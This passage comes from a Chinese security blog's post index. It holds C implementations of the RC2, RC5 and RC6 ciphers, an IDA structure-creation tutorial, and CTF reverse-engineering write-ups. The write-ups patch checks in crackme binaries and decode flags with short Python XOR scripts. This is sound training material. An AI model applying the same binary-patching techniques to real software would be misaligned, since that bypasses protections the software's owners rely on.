4 || i == 10) &#123; x10 += xkey[x76 &amp; 63]; x32 += xkey[x10 &amp; 63]; x54 += xkey[x32 &amp; 63]; x76 += xkey[x54 &amp; 63]; &#125; &#125; cipher[0] = (unsigned char)x10; cipher[1] = (unsigned char)(x10 &gt;&gt; 8); cipher[2] = (unsigned char)x32; cipher[3] = (unsigned char)(x32 &gt;&gt; 8); cipher[4] = (unsigned char)x54; cipher[5] = (unsigned char)(x54 &gt;&gt; 8); cipher[6] = (unsigned char)x76; cipher[7] = (unsigned char)(x76 &gt;&gt; 8);&#125; 解密算法解密操作即为加密操作的逆运算。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950void rc2_decrypt(unsigned short xkey[64], unsigned char *plain, unsigned char *cipher)&#123; unsigned x76, x54, x32, x10, i; x76 = (cipher[7] &lt;&lt; 8) + cipher[6]; x54 = (cipher[5] &lt;&lt; 8) + cipher[4]; x32 = (cipher[3] &lt;&lt; 8) + cipher[2]; x10 = (cipher[1] &lt;&lt; 8) + cipher[0]; i = 15; do &#123; // R[i] = R[i] ror s[i]; // R[i] = R[i] - K[j] - (R[i-1] &amp; R[i-2]) - ((~R[i-1]) &amp; R[i-3]); // j = j - 1; x76 &amp;= 65535; x76 = (x76 &lt;&lt; 11) + (x76 &gt;&gt; 5); x76 -= (x10 &amp; ~x54) + (x32 &amp; x54) + xkey[4 * i + 3]; x54 &amp;= 65535; x54 = (x54 &lt;&lt; 13) + (x54 &gt;&gt; 3); x54 -= (x76 &amp; ~x32) + (x10 &amp; x32) + xkey[4 * i + 2]; x32 &amp;= 65535; x32 = (x32 &lt;&lt; 14) + (x32 &gt;&gt; 2); x32 -= (x54 &amp; ~x10) + (x76 &amp; x10) + xkey[4 * i + 1]; x10 &amp;= 65535; x10 = (x10 &lt;&lt; 15) + (x10 &gt;&gt; 1); x10 -= (x32 &amp; ~x76) + (x54 &amp; x76) + xkey[4 * i + 0]; // R[i] = R[i] - K[R[i-1] &amp; 63]; if (i == 5 || i == 11) &#123; x76 -= xkey[x54 &amp; 63]; x54 -= xkey[x32 &amp; 63]; x32 -= xkey[x10 &amp; 63]; x10 -= xkey[x76 &amp; 63]; &#125; &#125; while (i--); plain[0] = (unsigned char)x10; plain[1] = (unsigned char)(x10 &gt;&gt; 8); plain[2] = (unsigned char)x32; plain[3] = (unsigned char)(x32 &gt;&gt; 8); plain[4] = (unsigned char)x54; plain[5] = (unsigned char)(x54 &gt;&gt; 8); plain[6] = (unsigned char)x76; plain[7] = (unsigned char)(x76 &gt;&gt; 8);&#125; RC5RC5 同样也是分组密码，它支持可变的分组大小(32、64 或 128 比特)，密钥长度（0 至 2040 位）和加密轮数（0 ～ 255）。RC5 中有几个参数，w 代表一个字的字节大小，RC5 是以一个字为单位来进行所有操作的；r 代表加密轮数；b 代表密钥的长度。RC5 常用的 w 通常为 16、32 和 64。下面实现的是 w 为 32 时的 RC5 算法。 RC5 和 RC2 类似，总共分为三个算法步骤。分别是密钥扩展、加密、解密。 算法中需要一些宏定义： 1234567891011typedef unsigned int WORD; /* Should be 32-bit = 4 bytes */#define w 32 /* word size in bits */#define r 12 /* number of rounds */#define b 16 /* number of bytes in key */#define c 4 /* number words in key */#define t 26 /* size of table S = 2*(r+1) words */WORD S[t]; /* expanded key table */WORD P = 0xb7e15163, Q = 0x9e3779b9; /* magic constants *//* Rotation operators. x must be unsigned, to get logical right shift */#define ROTL(x, y) (((x) &lt;&lt; (y &amp; (w - 1))) | ((x) &gt;&gt; (w - (y &amp; (w - 1)))))#define ROTR(x, y) (((x) &gt;&gt; (y &amp; (w - 1))) | ((x) &lt;&lt; (w - (y &amp; (w - 1))))) 密钥扩展算法密钥扩展首先分别初始化 L 数组和 S 盒，随后通过 L 进行按字异或得到 S 盒。 123456789101112131415161718void rc5_keygen(unsigned char *K) /* secret input ket K[0...b-1] */&#123; WORD i, j, k, u = w / 8, A, B, L[c]; /* Initialize L, then S, then mix key into S */ for (i = b - 1, L[c - 1] = 0; i != -1; i--) &#123; L[i / u] = (L[i / u] &lt;&lt; 8) + K[i]; &#125; for (S[0] = P, i = 1; i &lt; t; i++) &#123; S[i] = S[i - 1] + Q; &#125; for (A = B = i = j = k = 0; k &lt; 3 * t; k++, i = (i + 1) % t, j = (j + 1) % c) /* 3*t &gt; 3*c */ &#123; A = S[i] = ROTL(S[i] + (A + B), 3); B = L[j] = ROTL(L[j] + (A + B), (A + B)); &#125;&#125; 加密算法加密涉及的一个简单轮函数的加密。基于安全需要和时间方面的考虑，建议 12 或 20 轮加密。 123456789101112131415161718192021222324void rc5_encrypt(unsigned char *plain, unsigned char *cipher) /* 2 WORD input pt/output ct */&#123; WORD pt[2], ct[2]; for (int i = 0; i &lt; 2; i++) &#123; pt[i] = plain[4 * i] + (plain[4 * i + 1] &lt;&lt; 8) + (plain[4 * i + 2] &lt;&lt; 16) + (plain[4 * i + 3] &lt;&lt; 24); &#125; WORD A = pt[0] + S[0], B = pt[1] + S[1]; for (int i = 1; i &lt;= r; i++) &#123; A = ROTL(A ^ B, B) + S[2 * i]; B = ROTL(B ^ A, A) + S[2 * i + 1]; &#125; ct[0] = A; ct[1] = B; for (int i = 0; i &lt; 2; i++) &#123; cipher[4 * i] = ct[i] &amp; 0xFF; cipher[4 * i + 1] = (ct[i] &gt;&gt; 8) &amp; 0xFF; cipher[4 * i + 2] = (ct[i] &gt;&gt; 16) &amp; 0xFF; cipher[4 * i + 3] = (ct[i] &gt;&gt; 24) &amp; 0xFF; &#125;&#125; 解密算法解密实际上就是加密过程的逆运算。 1234567891011121314151617181920212223void rc5_decrypt(unsigned char *cipher, unsigned char *plain) /* 2 WORD input ct/output pt */&#123; WORD pt[2], ct[2]; for (int i = 0; i &lt; 2; i++) &#123; ct[i] = cipher[4 * i] + (cipher[4 * i + 1] &lt;&lt; 8) + (cipher[4 * i + 2] &lt;&lt; 16) + (cipher[4 * i + 3] &lt;&lt; 24); &#125; WORD B = ct[1], A = ct[0]; for (int i = r; i &gt; 0; i--) &#123; B = ROTR(B - S[2 * i + 1], A) ^ A; A = ROTR(A - S[2 * i], B) ^ B; &#125; pt[1] = B - S[1]; pt[0] = A - S[0]; for (int i = 0; i &lt; 2; i++) &#123; plain[4 * i] = pt[i] &amp; 0xFF; plain[4 * i + 1] = (pt[i] &gt;&gt; 8) &amp; 0xFF; plain[4 * i + 2] = (pt[i] &gt;&gt; 16) &amp; 0xFF; plain[4 * i + 3] = (pt[i] &gt;&gt; 24) &amp; 0xFF; &#125;&#125; RC6RC6 是一个从 RC5 派生而来的对称分组加密算法，用以满足高级加密标准（AES）竞赛的要求。RC6 拥有 128 位的块大小，支持 128、192、256 位乃至 2040 位的密钥长度。像 RC5 一样，RC6 是可以被参数化的。它也因而支持变长的分组大小、密钥长度以及加密轮数。RC6 和 RC5 在结构、使用基于数据的置换规则、取模加法以及异或操作等很多方面都很相似。事实上，RC6 可以被看做是交织的两组平行的 RC5 加密。其中，RC6 使用了乘法运算，能够让置换基于字中每一位，而不是其中的几位。 算法中需要一些宏定义： 123456789101112typedef unsigned int WORD; /* Should be 32-bit = 4 bytes */#define w 32 /* word size in bits */#define r 20 /* based on security estimates */#define bytes (w / 8) /* bytes per word */#define c ((b + bytes - 1) / bytes) /* key in words, rounded up */#define R24 (2 * r + 4) /* length of array S */#define lgw 5 /* log2(w) -- wussed out */WORD S[R24 - 1]; /* Key schedule */WORD P = 0xb7e15163, Q = 0x9e3779b9; /* magic constants *//* Rotation operators. x must be unsigned, to get logical right shift */#define ROTL(x, y) (((x) &lt;&lt; (y &amp; (w - 1))) | ((x) &gt;&gt; (w - (y &amp; (w - 1)))))#define ROTR(x, y) (((x) &gt;&gt; (y &amp; (w - 1))) | ((x) &lt;&lt; (w - (y &amp; (w - 1))))) 密钥扩展算法RC6 中接受的密钥长度相比于 RC5 更长，生成的 S 盒大小为 2r+4。 12345678910111213141516171819202122232425262728void rc6_keygen(unsigned char *K, int b)&#123; int i, j, s, v; WORD L[(32 + bytes - 1) / bytes]; /* Big enough for max b */ WORD A, B; L[c - 1] = 0; for (i = b - 1; i &gt;= 0; i--) L[i / bytes] = (L[i / bytes] &lt;&lt; 8) + K[i]; S[0] = P; for (i = 1; i &lt;= 2 * r + 3; i++) S[i] = S[i - 1] + Q; A = B = i = j = 0; v = R24; if (c &gt; v) v = c; v *= 3; for (s = 1; s &lt;= v; s++) &#123; A = S[i] = ROTL(S[i] + A + B, 3); B = L[j] = ROTL(L[j] + A + B, A + B); i = (i + 1) % R24; j = (j + 1) % c; &#125;&#125; 加密算法RC6 加密时比 RC5 多了乘法运算，加密过程也变得更复杂。 12345678910111213141516171819202122232425262728293031323334353637383940414243void rc6_encrypt(unsigned char *plain, unsigned char *cipher)&#123; WORD pt[4], ct[4]; for (int i = 0; i &lt; 4; i++) &#123; pt[i] = plain[4 * i] + (plain[4 * i + 1] &lt;&lt; 8) + (plain[4 * i + 2] &lt;&lt; 16) + (plain[4 * i + 3] &lt;&lt; 24); &#125; WORD A, B, C, D, t, u, x; A = pt[0]; B = pt[1]; C = pt[2]; D = pt[3]; B += S[0]; D += S[1]; for (int i = 2; i &lt;= 2 * r; i += 2) &#123; t = ROTL(B * (2 * B + 1), lgw); u = ROTL(D * (2 * D + 1), lgw); A = ROTL(A ^ t, u) + S[i]; C = ROTL(C ^ u, t) + S[i + 1]; x = A; A = B; B = C; C = D; D = x; &#125; A += S[2 * r + 2]; C += S[2 * r + 3]; ct[0] = A; ct[1] = B; ct[2] = C; ct[3] = D; for (int i = 0; i &lt; 4; i++) &#123; cipher[4 * i] = ct[i] &amp; 0xFF; cipher[4 * i + 1] = (ct[i] &gt;&gt; 8) &amp; 0xFF; cipher[4 * i + 2] = (ct[i] &gt;&gt; 16) &amp; 0xFF; cipher[4 * i + 3] = (ct[i] &gt;&gt; 24) &amp; 0xFF; &#125;&#125; 解密算法解密过程同样是加密过程的逆运算。 12345678910111213141516171819202122232425262728293031323334353637383940414243void rc6_decrypt(unsigned char *cipher, unsigned char *plain)&#123; WORD pt[4], ct[4]; for (int i = 0; i &lt; 4; i++) &#123; ct[i] = cipher[4 * i] + (cipher[4 * i + 1] &lt;&lt; 8) + (cipher[4 * i + 2] &lt;&lt; 16) + (cipher[4 * i + 3] &lt;&lt; 24); &#125; WORD A, B, C, D, t, u, x; A = ct[0]; B = ct[1]; C = ct[2]; D = ct[3]; C -= S[2 * r + 3]; A -= S[2 * r + 2]; for (int i = 2 * r; i &gt;= 2; i -= 2) &#123; x = D; D = C; C = B; B = A; A = x; u = ROTL(D * (2 * D + 1), lgw); t = ROTL(B * (2 * B + 1), lgw); C = ROTR(C - S[i + 1], t) ^ u; A = ROTR(A - S[i], u) ^ t; &#125; D -= S[1]; B -= S[0]; pt[0] = A; pt[1] = B; pt[2] = C; pt[3] = D; for (int i = 0; i &lt; 4; i++) &#123; plain[4 * i] = pt[i] &amp; 0xFF; plain[4 * i + 1] = (pt[i] &gt;&gt; 8) &amp; 0xFF; plain[4 * i + 2] = (pt[i] &gt;&gt; 16) &amp; 0xFF; plain[4 * i + 3] = (pt[i] &gt;&gt; 24) &amp; 0xFF; &#125;&#125; ReferencesRC_algorithmA Comparative Study of Rivest Cipher Algorithms现代密码学教程A Description of the RC2(r) Encryption AlgorithmThe RC\u00015 Encryption AlgorithmThe RC6 Block Cipher","categories":[],"tags":[{"name":"c","slug":"c","permalink":"blog.b3ale.cn/tags/c/"},{"name":"crypto","slug":"crypto","permalink":"blog.b3ale.cn/tags/crypto/"}]},{"title":"如何使用IDA创建结构体","slug":"如何使用IDA创建结构体","date":"2019-09-01T03:16:02.000Z","updated":"2019-09-01T08:07:29.727Z","comments":true,"path":"2019/09/01/如何使用IDA创建结构体/","link":"","permalink":"blog.b3ale.cn/2019/09/01/如何使用IDA创建结构体/","excerpt":"IDA 无法直接反编译出程序所构造的结构体，但我们可以通过观察伪代码来判断并在 IDA 中创建结构体","text":"IDA 无法直接反编译出程序所构造的结构体，但我们可以通过观察伪代码来判断并在 IDA 中创建结构体 Source Code源码摘自菜鸟教程的 C 语言教程： 1234567891011121314#include &lt;stdio.h&gt;struct Books&#123; char title[10]; char author[10]; char subject[20]; int book_id;&#125; book = &#123;\"C 语言\", \"RUNOOB\", \"编程语言\", 123456&#125;;int main()&#123; printf(\"title : %s\\nauthor: %s\\nsubject: %s\\nbook_id: %d\\n\", book.title, book.author, book.subject, book.book_id);&#125; Problem在 IDA 中 f5 反编译后得到的结果： 12345678910int __cdecl main(int argc, const char **argv, const char **envp)&#123; printf( \"title : %s\\nauthor: %s\\nsubject: %s\\nbook_id: %d\\n\", &amp;book, (char *)&amp;book + 10, (char *)&amp;book + 20, (unsigned int)dword_100001040); return 0;&#125; 可以看到 IDA 并不能解析出我们构造的结构体。IDA 之所以在分析阶段无法识别结构体，可能源于两个原因。 首先，虽然 IDA 了解某个结构体的布局，但它并没有足够的信息，能够判断程序确实使用了结构体。 其次，程序中的结构体可能是一种 IDA 对其一无所知的非标准结构体。 Solution关于结构体我们所会使用的主要操作包括添加、删除和编辑结构体。首先打开 Structures（结构体）窗口，使用热键 INSERT 打开 Creat Structure/Union（创建结构体/联合）对话框。 为了创建一个新的结构体，必须首先在 Structure name（结构体名称）输入框中指定结构体的名称。前两个复选框用于决定新结构体在结构体窗口中的显示位置，或者是否在窗口中显示新结构体。第三个复选框 Creat union（创建联合），指定你定义的是否为 C 风格联合结构体。结构体的大小是它所包含的字段大小的总和，而联合的大小则等于其中最大字段的大小。Add standard structure（添加标准结构体）按钮用于访问 IDA 当前能够识别的全部结构体数据类型。指定结构体的名称并单击 OK 后，IDA 将在结构体窗口中创建一个空结构体定义。 为了给新结构体添加字段，必须利用字段创建命令 D、A 和数字键盘上的星号键(*)。D 命令的行为非常依赖于光标的位置，建议采用下面的步骤给结构体添加字段。 首先将光标放在结构体定义的最后一行（包含 ends 的那一行）并按下 D 键。这时，IDA 就会在结构体的末尾添加一个新字段。新字段的大小取决于你在数据转盘上选择的第一个大小。最初，字段的名称为 field_N，这里的 N 为结构体开头到新字段(如 field_0)开头的数字偏移量。 如果需要修改字段的大小，首先将光标放在新字段的名称上，然后重复按下 D 键，使数据转盘上的数据类型开始循环，从而为新字段选择正确的数据大小。另外，你还可以使用 Options ► Setup Data Types 来指定一个在数据转盘上不存在的大小。如果新字段是一个数组，右击其名称并在上下文菜单中选择 Array，将打开“数组规范”对话框。 要更改一个结构体字段的名称，单击字段名称并按下 N 键，或者右击该名称并在上下文菜单中选择 Name，然后在输入框中输入一个名称即可。 根据以上步骤，可以构造如下结构体。 在定义自己的结构体时，下面的提示可能会有所帮助。 一个字段的字节偏移量以一个 8 位十六进制值在结构体窗口的左侧显示。 每次你添加或删除一个结构体字段，或更改一个现有字段的大小，结构体的新 sizeof 大小都会在结构体定义的第一行反映出来。 可以给一个结构体字段添加注释，就像给任何反汇编行添加注释一样。右击（或使用热键）希望为其添加注释的字段，在上下文菜单中选择一个注释选项即可。 与结构体窗口顶部的说明不同的是，只有当一个字段是结构体中的最后一个字段时，使用 U 键才能删除该字段。对于所有其他字段，按下 U 键将取消该字段的定义，这样做仅仅删除了该字段的名称，并没有删除分配给该字段的字节。 必须对一个结构体定义中的所有字段进行适当的对齐。IDA 并不区分已压缩和未压缩的结构体。为将字段适当对齐，如需要填补字节，那么必须负责添加这些字节。填补字节最好作为适当大小的哑字段添加。在添加额外的字段后，可以选择取消或保留这些字段的定义。 分配到结构体中间的字节只有在取消关联字段的定义后才能删除，使用 Edit ► Shrink Struct Type（缩小结构体类型）即可删除被取消定义的字节。 可以在结构体的中间添加新的字节：选择新字节后面的一个字段，然后使用 Edit ► Expand Struct Type（扩大结构体类型）在选中的字段前插入一定数量的字节。 如果知道结构体的大小，而不了解它的布局，就需要创建两个字段。第一个字段为一个数组，它的大小为结构体的大小减去 1 个字节(size-1)；第二个字段应为 1 个字节。创建第二个字段后，取消第一个（数组）字段的定义。这样，结构体的大小被保留下来，随后，当进一步了解该结构体的布局后，可以回过头来定义它的字段及其大小。 通过重复应用这些步骤（添加字段、设置字段大小、添加填补字节等），就可以在 IDA 中创建一个 Books 结构体。 重新给变量设置数据类型为 Book，得到如下结果。 12345int __cdecl main(int argc, const char **argv, const char **envp)&#123; printf(\"title : %s\\nauthor: %s\\nsubject: %s\\nbook_id: %d\\n\", &amp;book, &amp;book.gap1[9], &amp;book.gapC[8], unk_100001040); return 0;&#125; 还有一种方法是直接导入新的结构体。IDA 能够解析 C（而非 C++）数据声明，以及整个 C 头文件，并自动为在这些声明或头文件中定义的结构体创建对应的 IDA 结构体。如果碰巧有正在进行逆向的二进制文件的源代码，或者头文件，那么就可以让 IDA 直接从源代码中提取出相关结构体，从而节省大量时间。 IDA 5.2 版引入了 “本地类型” 子窗口，使用 View ► OpenSubviews ► Local Types（查看 ► 打开子窗口 ► 本地类型）打开该窗口，其中列出了所有解析到当前数据库中的类型。新数据库的“本地类型”窗口最初是空的，但是，该窗口能够通过 INSERT 键或上下文菜单中的 Insert 选项解析新的类型。 解析新类型时发生的错误将在 IDA 的消息窗口中显示。如果类型声明被成功解析，“本地类型” 窗口将列出该类型及其相关声明。可以看到先前在 Structures 窗口添加的结构体和刚才直接导入的结构体信息。 重新设置变量的数据类型为 Book2，可以得到一个完美的结果： 12345678910int __cdecl main(int argc, const char **argv, const char **envp)&#123; printf( \"title : %s\\nauthor: %s\\nsubject: %s\\nbook_id: %d\\n\", &amp;book, book.author, book.subject, (unsigned int)book.book_id); return 0;&#125; ReferencesThe IDA Pro Bookhttps://www.runoob.com/cprogramming/c-structures.html","categories":[],"tags":[{"name":"re","slug":"re","permalink":"blog.b3ale.cn/tags/re/"}]},{"title":"杭电CTF-题库-reverse","slug":"杭电CTF-题库-reverse","date":"2019-08-24T03:33:30.000Z","updated":"2019-08-28T05:01:31.376Z","comments":true,"path":"2019/08/24/杭电CTF-题库-reverse/","link":"","permalink":"blog.b3ale.cn/2019/08/24/杭电CTF-题库-reverse/","excerpt":"在杭电的平台上做了几道题。","text":"在杭电的平台上做了几道题。 ebCTF-Teaser-BIN100-Dice12$ file ebCTF-Teaser-BIN100-Dice.exeebCTF-Teaser-BIN100-Dice.exe: PE32 executable (console) Intel 80386 (stripped to external PDB), for MS Windows 拖进 OD，搜索字符串： 大概可以看出是一个摇骰子的游戏，如果全部正确就能得到 flag。最直接的想法就是用 OD 边调试边修改寄存器的值，最后就能得到 flag： 更方便的方式是直接在 IDA 里把所有判断不正确的跳转 patch 掉，这样就能直接得到结果： 也可以在 IDA 里直接逆，关键部分代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110... if ( v82 == 7 ) &#123; fctx.call_site = 1; v43 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;( (int)&amp;std::cout, \"[*] You rolled a seven, with a six sided dice! How awesome are you?!\"); v44 = std::ostream::operator&lt;&lt;(v43, std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); std::ostream::operator&lt;&lt;(v44, std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v85 *= 2; v85 *= 50; v85 /= 50; v85 += 65; v85 -= 65; v85 *= 42; v85 /= 42; v49 = time(0); v79 = v49; v81 = v49 - v80; if ( v49 - v80 &gt; 2 ) v85 *= 2; for ( i = 0; ; ++i ) &#123; fctx.call_site = 1; v50 = std::string::size((std::string *)&amp;v87); if ( i &gt;= v50 ) break; v51 = (_BYTE *)std::string::operator[]((std::string *)&amp;v87, i); *v51 ^= v85; &#125; i = 0; for ( j = 0; ; ++j ) &#123; fctx.call_site = 1; v52 = std::string::size((std::string *)&amp;v84); if ( j &gt;= v52 ) break; v64 = (_BYTE *)std::string::operator[]((std::string *)&amp;v84, j); v53 = (_BYTE *)std::string::operator[]((std::string *)&amp;v87, i); *v64 ^= *v53; ++i; v54 = std::string::length((std::string *)&amp;v87); if ( i &gt;= v54 ) i = 0; &#125; fctx.call_site = 1; if ( std::string::find((std::string *)&amp;v84, \"ebCTF\", 0) == -1 ) &#123; fctx.call_site = 1; v59 = std::ostream::operator&lt;&lt;(&amp;std::cout, std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v60 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;( v59, \"[!] It seems you did something wrong :( No flag for you.\"); v61 = std::ostream::operator&lt;&lt;(v60, std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); std::ostream::operator&lt;&lt;(v61, std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); fctx.call_site = 3; std::string::~string((std::string *)&amp;v72); fctx.call_site = 5; std::string::~string((std::string *)&amp;v73); fctx.call_site = 7; std::string::~string((std::string *)&amp;v74); fctx.call_site = 9; std::string::~string((std::string *)&amp;v75); fctx.call_site = 11; std::string::~string((std::string *)&amp;v76); fctx.call_site = 13; std::string::~string((std::string *)&amp;v77); fctx.call_site = 15; std::string::~string((std::string *)&amp;v78); fctx.call_site = 16; std::string::~string((std::string *)&amp;v83); fctx.call_site = 17; std::string::~string((std::string *)&amp;v84); fctx.call_site = -1; std::string::~string((std::string *)&amp;v87); v65 = 0; &#125; else &#123; v55 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;( (int)&amp;std::cout, \"[*] You rolled 3-1-3-3-7, what does that make you? ELEET! \\\\o/\"); std::ostream::operator&lt;&lt;(v55, std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v56 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;((int)&amp;std::cout, \"[*] Nice job, here is the flag: \"); v57 = std::operator&lt;&lt;&lt;char,std::char_traits&lt;char&gt;,std::allocator&lt;char&gt;&gt;(v56, &amp;v84); v58 = std::ostream::operator&lt;&lt;(v57, std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); std::ostream::operator&lt;&lt;(v58, std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); fctx.call_site = 3; std::string::~string((std::string *)&amp;v72); fctx.call_site = 5; std::string::~string((std::string *)&amp;v73); fctx.call_site = 7; std::string::~string((std::string *)&amp;v74); fctx.call_site = 9; std::string::~string((std::string *)&amp;v75); fctx.call_site = 11; std::string::~string((std::string *)&amp;v76); fctx.call_site = 13; std::string::~string((std::string *)&amp;v77); fctx.call_site = 15; std::string::~string((std::string *)&amp;v78); fctx.call_site = 16; std::string::~string((std::string *)&amp;v83); fctx.call_site = 17; std::string::~string((std::string *)&amp;v84); fctx.call_site = -1; std::string::~string((std::string *)&amp;v87); &#125; &#125;... 脚本： 123456789101112#!/usr/bin/env pythonkey = [0x02, 0x37, 0x0F, 0x35, 0x0F, 0x3C, 0x15, 0x07, 0x3C, 0x30, 0x2A, 0x30, 0x55, 0x12, 0x37, 0x15, 0x1E, 0x35, 0x01, 0x51]enc = [0x13, 0x21, 0x38, 0x15, 0x3D, 0x33, 0x57, 0x47, 0x2D, 0x27, 0x6A, 0x73, 0x44, 0x05, 0x26, 0x59, 0x5C, 0x79, 0x17, 0x44, 0x45, 0x77, 0x1A, 0x75, 0x49, 0x7D, 0x05, 0x4A, 0x78, 0x74, 0x6A, 0x70, 0x42, 0x02, 0x71, 0x05, 0x0F, 0x22, 0x08]k = 116flag = ''lenEnc = len(enc)lenKey = len(key)for i in range(lenKey): key[i] = key[i] ^ kfor i in range(lenEnc): flag += chr(enc[i] ^ key[i % lenKey])print flag keylead12$ file keyleadkeylead: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c1d5a4a7ffa57a2335f88093530dc89c1c71ec72, stripped 发现功能和前一题一模一样，就是变成了 elf，在 IDA 里各种 patch 就能直接出 flag： 12345678910┌─[root][bead49282cbc][~/tmp]└─▪ ./keyleadhi all ----------------------Welcome to dice game!You have to roll 5 dices and get 3, 1, 3, 3, 7 in order.Press enter to roll.You rolled 5, 3, 4, 4, 5.You rolled as I said! I&apos;ll give you the flag.ASIS&#123;1fc1089e328eaf737c882ca0b10fcfe6&#125; 输出 flag 的函数也不用逆，直接照着实现就行： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218void func()&#123; int v0; // ST0C_4 int v1; // ST08_4 int v2; // ST0C_4 int v3; // ST0C_4 int v4; // ST08_4 int v5; // ST0C_4 int v6; // ST08_4 int n; // [rsp+8h] [rbp-8h] int v8; // [rsp+8h] [rbp-8h] int i; // [rsp+8h] [rbp-8h] int j; // [rsp+8h] [rbp-8h] int m; // [rsp+Ch] [rbp-4h] int v12; // [rsp+Ch] [rbp-4h] int v13; // [rsp+Ch] [rbp-4h] int v14; // [rsp+Ch] [rbp-4h] int v15; // [rsp+Ch] [rbp-4h] int v16; // [rsp+Ch] [rbp-4h] m = 0; n = 0; while ( m != 1 ) &#123; putchar(enc[14 * m++]); do &#123; while ( n &lt;= 1 ) putchar(enc[20 * m - 8 * n++]); v1 = n + 1; v2 = 3 * m; putchar(enc[2 * v2 + 11 + v1]); v2 *= 5; v8 = v1 - 1; putchar(enc[2 * v2 + v8]); v12 = v2 / 3; while ( 1 ) &#123; while ( 1 ) &#123;LABEL_12: if ( !v8 ) &#123; putchar(enc[2 * v12]); v15 = v12 ^ 2; while ( 2 ) &#123; for ( i = 1; i &lt;= 9; ++i ) putchar(enc[10 * (i % 2) + 3 + v15]); v13 = v15 + 1;LABEL_44: putchar(enc[v13 / 3]); if ( i == 10 ) &#123; v13 += 2 * v13 + 13; i = 19; goto LABEL_33; &#125; if ( i == 2 ) &#123; i = v13-- + 2; goto LABEL_4; &#125; if ( (unsigned int)(i - 22) &lt;= 0xA ) &#123; v14 = v13 - 3; for ( j = i - v14; ; j = 8 ) &#123;LABEL_58: putchar(enc[v14 + 1]); v16 = v14 + 1; if ( j == 11 ) &#123; v13 = (v16 + 14) / 2; i = 11 * (v13 / 6); goto LABEL_44; &#125; if ( j != 13 ) break; v12 = v16 + 8; v8 = 2;LABEL_51: while ( 2 ) &#123; putchar(enc[v12 - 10]); if ( v8 == v12 ) &#123; v4 = v8 + 2; v5 = v12 + 2; putchar(enc[v5 / 2 + v4 / 5]); i = v4 / 2; putchar(enc[i / 5 + v5]); v13 = v5 + i - 1 + v5; while ( 1 ) &#123;LABEL_33: putchar(enc[v13 - 19]); if ( i == 2 ) &#123; v3 = v13 + 1; putchar(enc[v3 / 2 - 3]); v13 = v3 / 5 + 2; i = 2; goto LABEL_44; &#125; if ( i &lt;= 2 ) break; if ( i == 10 ) &#123; v12 = v13 - 31; v8 = 9; goto LABEL_51; &#125; if ( i != 19 ) goto LABEL_44; i = 2; &#125; if ( i == 1 ) &#123; v8 = 17; v12 = v13 % 5 - 17 + v13;LABEL_20: putchar(enc[v12 - v8 + 9]); v12 += ~v8++; continue; &#125; goto LABEL_44; &#125; break; &#125; if ( v8 != 9 ) &#123; if ( v8 != 2 ) goto LABEL_12; j = 2; v16 = v12 - 18;LABEL_64: v6 = 9 * j; putchar(enc[v16 / 2 + v6 + v6 % 10]); m = v16 + 1; n = v6 % 10; goto LABEL_21; &#125; putchar(enc[v12 - 16]); v14 = v12 / 2; &#125; if ( j == 8 ) &#123; v15 = v16 + 1; i = 7; continue; &#125; goto LABEL_64; &#125; goto LABEL_4; &#125; &#125; if ( v8 == 2 ) break; if ( v12 == 7 ) &#123; putchar(enc[21 - v8]); v13 = 49; i = v8 / 3; goto LABEL_33; &#125; if ( v8 != 3 ) goto LABEL_20; putchar(enc[2 * (v12 / 3)]); v13 = v12 / 3; i = 9; do &#123; while ( 1 ) &#123; if ( v13 == 10 ) &#123; putchar(enc[i + 8]); v14 = 9; j = i + 1; goto LABEL_58; &#125; if ( v13 == 11 ) &#123; putchar(enc[i / 7]); v13 = i-- - 11; &#125;LABEL_4: if ( i != 9 ) break; putchar(enc[v13 * v13 + 7]); v13 = v13 * v13 + 1; i = 10; &#125; &#125; while ( i != 13 ); putchar(enc[2 * v13 + 12]); v8 = 3; v12 = 3 * v13; &#125; putchar(enc[3 * v12 + 1]); v0 = v12 * v12; putchar(enc[v0 - 15]); m = v0 - 15; n = 4; putchar(enc[4]);LABEL_21: if ( n != 4 ) break; putchar(enc[m + 6]); v12 = m - 3; v8 = 3; &#125; &#125; while ( n != 8 ); putchar(enc[2 * m + 32]); &#125;&#125; Reverse0212$ file Reverse02.exeReverse02.exe: PE32 executable (GUI) Intel 80386, for MS Windows 定位到MessageBoxA，把这部分逆一下就完事了： 12345678910111213141516171819202122int func()&#123; char *v0; // eax char Dst; // [esp+0h] [ebp-38h] char v3; // [esp+1h] [ebp-37h] char v4; // [esp+Fh] [ebp-29h] Dst = 0; memset(&amp;v3, 0, 0x30u); strncpy_s(&amp;Dst, 0x31u, \"flag:&#123;NSCTF_md57e0cad17016b0&gt;?45?f7c&gt;0&gt;4a&gt;1c3a0&#125;\", 0x30u); v0 = &amp;v4; if ( v4 != '&#125;' ) &#123; do &#123; *v0 ^= 7u; ++v0; &#125; while ( *v0 != '&#125;' ); &#125; return MessageBoxA(0, &amp;Dst, \"Flag\", 0);&#125; 脚本： 123456#!/usr/bin/env pythonenc = '7e0cad17016b0&gt;?45?f7c&gt;0&gt;4a&gt;1c3a0'flag = ''for i in range(len(enc)): flag += chr(ord(enc[i]) ^ 7)print flag Reverse 10012$ file Reverse\\ 100.exeReverse 100.exe: PE32 executable (console) 